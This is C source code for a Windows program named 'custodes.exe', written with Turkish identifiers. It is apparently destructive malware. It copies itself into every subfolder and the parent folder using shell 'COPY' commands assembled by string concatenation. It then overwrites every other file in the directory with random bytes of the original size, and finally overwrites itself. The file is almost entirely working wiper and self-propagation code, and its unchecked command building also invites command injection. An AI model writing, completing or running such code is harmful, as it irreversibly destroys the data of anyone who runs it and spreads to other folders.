#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <location\tinydir.h>
#include <windows.h>
#include <process.h>
#include <errno.h>
int main()
{
	tinydir_dir dir;
	tinydir_open(&dir, "./");
	char kurban_dosya[200];
	char kopyala_yol[200]="";
	while (dir.has_next)
	{	
    	tinydir_file file;
    	tinydir_readfile(&dir, &file);
    	if (file.is_dir)
    	{
        	char kopyala_yol[200]="";
        	FILE *runner;
        	strcat(kopyala_yol,"\".\\");
        	strcat(kopyala_yol,file.name);
        	strcat(kopyala_yol,"\\custodes.exe\"");
        	if(kopyala_yol[3]!=46){
        		dosya_kopyala("custodes.exe",kopyala_yol);
				getchar();
        	}
    	}
	else{
        if(strcmp(file.name,"custodes.exe")!=0){
        	bdoldur(file.name);
        }
    }
    tinydir_next(&dir);
	}
   	tinydir_close(&dir);
    dosya_kopyala(".\\custodes.exe","..\\custodes.exe");
//  system("..\\custodes.exe");
   bdoldur("custodes.exe");
   getchar();
   return 0;
}
//den
int bdoldur(char *dosya){
	unsigned long boyut=1;
	unsigned long toplambok=0;
	char rnd;
	FILE *acilandosya;
	boyut=dosya_olc(dosya);
	if(boyut>=1){
		acilandosya=fopen(dosya,"w");
		while(toplambok<boyut){
		rnd=rand()%255;
		fputc(rnd, acilandosya);
		toplambok+=1;
		}
      fclose(acilandosya);
	}
      return 1;
}

int dosya_olc(FILE *dosya)
{
	struct stat st;
	int sonuc;
  	stat(dosya, &st);
	sonuc=st.st_size;
  	return sonuc;
}

int dosya_kopyala(char kaynak[2000], char hedef[2000]){
	char komut[1000]="";
	strcat(komut,"COPY /B /Y \"");
	strcat(komut,kaynak);
	strcat(komut,"\" \"");
	strcat(komut,hedef);
	strcat(komut,"\"");
	system(komut);
	return 1;
}
